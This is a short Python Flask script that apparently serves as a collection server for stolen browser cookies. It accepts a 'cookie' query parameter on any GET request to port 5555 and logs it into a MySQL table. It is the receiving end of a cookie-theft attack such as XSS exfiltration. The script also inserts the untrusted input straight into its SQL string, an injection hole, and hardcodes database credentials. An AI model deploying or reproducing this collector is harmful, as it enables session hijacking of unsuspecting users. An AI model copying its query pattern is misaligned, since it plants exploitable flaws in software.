from flask import Flask, request
import pymysql

app = Flask(__name__)

def db_connector(sql_command):
    MYSQL_DB = {
        'user': 'dbuser',
        'password': 'abcd1234',
        'host': 'localhost',
        'port': '3306',
        'database': 'cookie'
    }
    db = pymysql.connect(
        host=MYSQL_DB['host'],
        port=int(MYSQL_DB['port']),
        user=MYSQL_DB['user'],
        passwd=MYSQL_DB['password'],
        db=MYSQL_DB['database'],
        charset='utf8'
    )
    cursor = db.cursor()
    cursor.execute(sql_command)
    result = cursor.fetchall()
    db.commit()
    db.close()
    return str(result).replace("(", "").replace(")", "").replace("'", "").replace(',', '').rstrip()

@app.route('/', methods=['GET'])
def index():
    cookie = request.args.get('cookie')
    db_connector(f"INSERT INTO cookietable(cookie) VALUES('{cookie}');")
    return "ok"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5555)
